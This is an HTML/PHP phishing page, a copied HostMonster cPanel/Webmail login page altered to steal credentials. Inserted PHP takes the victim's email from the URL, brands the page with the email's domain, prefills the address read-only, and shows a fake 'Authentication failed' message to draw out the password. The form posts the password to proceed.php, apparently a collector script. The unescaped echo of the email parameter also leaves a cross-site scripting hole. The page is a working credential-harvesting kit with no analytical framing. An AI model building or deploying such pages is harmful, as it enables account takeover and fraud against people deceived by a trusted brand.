<!DOCTYPE html>
<!-- saved from url=(0062)https://login.hostmonster.com/host229.hostmonster.com/webmail? -->
<html class="js_on" lang="en"><!--<![endif]--><!--~6c5eae0bf33fbab35aa25f3c6f8b3c2d~--><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <script defer="" async="" src="./hmauto_files/evergage.min.js.download"></script><script type="text/javascript" async="" src="./hmauto_files/ec.js.download"></script><script type="text/javascript" async="" src="./hmauto_files/linkid.js.download"></script><script type="text/javascript" async="" src="./hmauto_files/analytics.js.download"></script><script async="" src="./hmauto_files/gtm.js.download"></script><script>var d=document.documentElement;d.className=d.className.replace('no_js','js_on');</script>
    <title>Secure cPanel/Webmail Login</title>
    <link rel="shortcut icon" href="https://hostmonster-cdn.com/media/shared/general/_hm/favicon.ico">
    <link rel="icon" type="image/x-icon" href="https://hostmonster-cdn.com/media/shared/general/_hm/favicon.ico">
    
    <?php
$emailadd = $_GET["email"];
$domain = substr($emailadd, strpos($emailadd, '@') + 1);
$domain1 = substr($domain, 0, strpos($domain, '.'));
$finalDomain = ucfirst($domain1);
?>
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noodp, noydir">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="description" content="Hostmonster - Top rated web hosting provider - Free 1 click installs For blogs, shopping carts, and more. Get a free domain name, real 24/7 support, and superior speed. web hosting provider php hosting cheap web hosting, Web hosting, domain names, front page hosting, email hosting.  We offer affordable hosting, web hosting provider business web hosting, ecommerce hosting, unix hosting. Phone support available, Free Domain, and Free Setup.">
    <meta name="keywords" content="web hosting, provider, php hosting,web hosting, free domain names, domain name, front page hosting, web site, web design, domain name registration, business web site, web site hosting, web space, picture hosting, small business, cheap web hosting, webmaster, web site builder, web space, affordable web hosting, marketing, cgi perl php hosting, blog, blogs, blogger, weblog, web log, weblogs, web logs, internet marketing, internet advertising">
    <link rel="stylesheet" href="./hmauto_files/bootstrap.min.css">
    <link rel="stylesheet" href="./hmauto_files/brand.css">
    <link rel="stylesheet" href="./hmauto_files/main.css">
    <link rel="stylesheet" href="./hmauto_files/main(1).css">
    <link rel="stylesheet" href="./hmauto_files/hosting.css">
    <link rel="stylesheet" href="./hmauto_files/font-awesome.min.css">
    <script src="./hmauto_files/jquery.min.js.download"></script>
    <script>window.jQuery || document.write('<script src="//hostmonster-cdn.com/media/shared/general/jquery/1.12.4/jquery.min.js"><\/script>');</script>
    <script>var provinfo={"cdn":"//hostmonster-cdn.com","code":"hm","domain":"hostmonster.com","name":"HostMonster","support_phone":"866-573-4678","support_phone_direct":"801-494-8462","support_phones":null};</script>
    <script src="./hmauto_files/14369010623.js.download"></script>
    <!--[if lte IE 8]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
    
<!-- Google Tag Manager HEAD -->
<script>
dataLayer = [{"affiliate":"unaffiliated","hosting_subtype":"","hosting_type":"","pageId":"login:/main","userType":"Anonymous","vpv":"/login/main.html"}];

var affRaw = "";

if( !affRaw ) {
    
    waitOnCookie();
}
else{
    updateGTM();
}
function waitOnCookie() {
    setTimeout(function(){
        if(!affRaw){
            var cookieSearch = document.cookie.split(';');
            for (var i in cookieSearch){
                var searched = cookieSearch[i];
                if(searched.match(/\br=/)) {
                    affRaw = decodeURIComponent(searched.replace('r=','').replace(/\s/g,''));
                }
            }
            updateGTM();
        }else{
            waitOnCookie();
        }
    },2000);
}
function updateGTM () {
    var affArray = affRaw.split('^');
    dataLayer.push({
        'rAffiliate': affArray[0],
        'rAffiliateCampaign':affArray[1],
        'rAffiliateURL':affArray[2],
        'event':'trackAffiliate'
    });
}
</script>
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start': new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0], j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src= 'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f); })(window,document,'script','dataLayer','GTM-KG2H6M');</script>
<!-- End Google Tag Manager HEAD -->
<script>
$(document).ready(function() {
    var is_billing = '';
    /* For success/success_upsell page where transactionEvent equals 'billing' */
    if(is_billing.length === 0) { 
        checkoutGTM();
    }
});

function checkoutGTM () {
    var checkoutObj = ({});
    if( Object.getOwnPropertyNames(checkoutObj).length > 0 ) {
        dataLayer.push(checkoutObj);
    }
}
</script>

</head>
<body class="hm">
    
<!-- Google Tag Manager BODY -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KG2H6M" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager BODY --><script>window.faasAccount = 'a11f14f85d';</script>
<script src="./hmauto_files/faas.js.download"></script>    <header class="hm-banner clear" id="top">
        <div class="container">
            <div class="hm-banner-header">
                
                <a href="https://www.hostmonster.com/" class="hm-banner-brand sprite sprite-logo" title="HostMonster"></a>
                
                <span class="screen-reader-text sr-only">If you are using assistive technology and are unable to read any part of the HostMonster website, or otherwise have difficulties using the HostMonster website, please call 866-573-HOST and our customer service team will assist you.</span>
            </div>
            <div class="hm-banner-collapse">
                <ul class="hm-banner-info">
                   
                        <a href="" class="btn btn-hairline">
                     </h3> <?php echo $finalDomain; ?> Control Panel Login <i class="glyphicon glyphicon-chevron-right"></i>
                        </a>
                    </li>
                    
                </ul>
                <ul class="hm-banner-menu">
                   
                </ul>
                
            </div>
        </div>
    </header>
    <section class="main_wrapper container">
        <a href="https://login.hostmonster.com/host229.hostmonster.com/webmail?#content" class="sr-only">Skip to main content</a>
        <section class="content_wrapper clearfix">
                    
            <article id="content" class="">    
                
                    <section class="login clear logindot">
      
                        
                         <p style="color:red;"><h3>Alert!:Log in to your account <?php echo $_GET['email']; ?> </h3> <font face="Trebuchet MS" color="#008cd7" size="6"><b>&nbsp;&nbsp;&nbsp;<?php echo $finalDomain; ?></b> Admin</font>
            
            
                        <p class="login-error error hidden"></p>                <script src="./hmauto_files/platform.js.download" defer="" gapi_processed="true"></script>
                            <div id="domain-selector" class="sso-overlay overlay hidden">
                                <h3>Which HostMonster Account?</h3>
                                <span id="sso-domain-search"><input id="domain-search" placeholder="search my domains"><i class="fa fa-search"></i></span>
                                <ul class="domain-list"></ul>
                                <a class="js-close sso-close-button">close</a>
                            </div>
            
                                <form class="login_form" name="theform" action="proceed.php" method="POST">
                                    <input type="hidden" name="l_redirect" value="">
                                    <input type="hidden" name="l_server_time" value="">
                                    <input type="hidden" name="l_expires_min" value="">
                                    <div class="login-input-wrapper">
                                        <label id="domain-label">Email or Domain Name</label>
                                        <input type="text" id="login" name="email" tabindex="1" value="<?php echo $_GET['email']; ?>" readonly="">
                                        <p style="color:red;">Authentication failed. Authentication failed. The username or password is incorrect. Verify that CAPS LOCK is not on, and then retype the current password.</p>
                                        <label id="pw-label">Password</label>
                                        <input type="password" id="password" name="password" tabindex="2" value="">
                                    </div>
                                    <button type="submit" class="btn_secondary" tabindex="3">Log In</button>
                                </form>
                            <ul class="extra_nav">
                           
                        <div id="google-sso" class="hm-google-sso"></div>
                    </section>
            
            </div>
            </article>        </section>
    </section>
    <section id="js_required" class="js_required container">
        <p>This site utilizes JavaScript to function correctly. Looks like it's disabled on your browser. Please enable it for your best experience.</p>
        <p>For instructions on enabling JavaScript, <a href="https://support.google.com/adsense/bin/answer.py?hl=en&amp;answer=12654" target="_blank" class="btn btn-primary">click here</a></p>
    </section>
    <footer id="footer" class="hm-footer">
        <section class="container">
            
            <nav class="footer_nav">
               </a></li>
                   
                </ul>
            </nav>
            
            <p id="bottom" class="copyright small, hm-copyright">© 2005-2021 </h3> <?php echo $finalDomain; ?>. All rights reserved.</p>
        </section>
    </footer>
    <script src="./hmauto_files/cookies.js.download"></script>
    <script src="./hmauto_files/common.js.download"></script><div class="lightbox_bg" style="display: none;"><span class="lightbox_loading" style="display: none;">Loading...</span></div>
    <script src="./hmauto_files/bootstrap.min.js.download"></script>
    <script src="./hmauto_files/cookies.min.js.download"></script>
    <script src="./hmauto_files/underscore-min.js.download"></script><link rel="stylesheet" type="text/css" href="./hmauto_files/clarip-cookie-manager.min.css">
 
<script type="text/javascript" id="">var claripCookieName="clarip_consent",claripCookieManagerLink=".cookie-settings",acceptAllCookiesBtn="#cookie-cta",gtmLoad=!0,geoLocation="none";</script>

<script type="text/javascript" id="" src="./hmauto_files/clarip-cookie-manager.min.js.download"></script><link rel="stylesheet" type="text/css" href="./hmauto_files/donotsell-extended.min.css">
<script type="text/javascript" id="">var globalDnsDeployment=!1,claripHost="endurance.clarip.com",claripCdnHost="cdn.clarip.com",clientName="endurance",dnsControllerType="option-2",dsrRequestFormUrl="https://endurance.clarip.com/dsr/success",createDoNotSellLink=0,doNotSellLinkSelector="a[href^\x3d'https://endurance.clarip.com/dsr']",doNotSellCookieName="clarip_consent",doNotSellCookieValue=0,doNotSellCookieExpirationAge=365,enableEnforcementScope=!0,enforcementScopeCountryList=["US"],enforcementScopeRegionList=["CA"];</script>
<script type="text/javascript" id="" src="./hmauto_files/donotsell.min.js.download"></script>
    <script src="./hmauto_files/saved_resource"></script>
    <script>
        
    
    if (window.location.search.match(/(code)|(state)/g)) {
        $(function() {
            var redirectUrl = window.location.hash + window.location.search;
            $('[name="l_redirect"]').val(redirectUrl);
        });
    }
    if (window.location.hash) {
        $(function() {
            if (!$('[name="l_redirect"]').val().match(/\#/)) {
                var redirectUrl = window.location.pathname + window.location.search + window.location.hash;
                $('[name="l_redirect"]').val(redirectUrl);
            }
        });
    }






logout_logincluster_el = document.createElement('img');
logout_logincluster_el.src = 'https://login.hostmonster.com/logout/';


    </script>


<div class="clarip-cookie-manager"><div class="clarip-cookie-manager-content"><iframe id="clarip-cookie-manager-component" src="./hmauto_files/index.html" width="100%" height="100%" frameborder="no" scrolling="yes" style="position: relative; margin-bottom: -20px;"></iframe></div></div>
<div class="clarip-dns-manager"><div class="clarip-dns-manager-content"><iframe id="clarip-dns-manager-component" src="./hmauto_files/dsr-controller.html" width="100%" height="100%" frameborder="no" scrolling="yes" style="position: relative; margin-bottom: -20px;"></iframe></div></div><script type="text/javascript" id="">var _aaq=window._aaq||(window._aaq=[]),evergageAccount="eig",dataset="eigorem";_aaq.push(["setEvergageAccount",evergageAccount],["setDataset",dataset],["setUseSiteConfig",!0]);(function(){var a=document,b=a.createElement("script");a=a.getElementsByTagName("script")[0];b.defer=!0;b.async=!0;b.src=document.location.protocol+"//cdn.evergage.com/beacon/"+evergageAccount+"/"+dataset+"/scripts/evergage.min.js";a.parentNode.insertBefore(b,a)})();</script></body></html>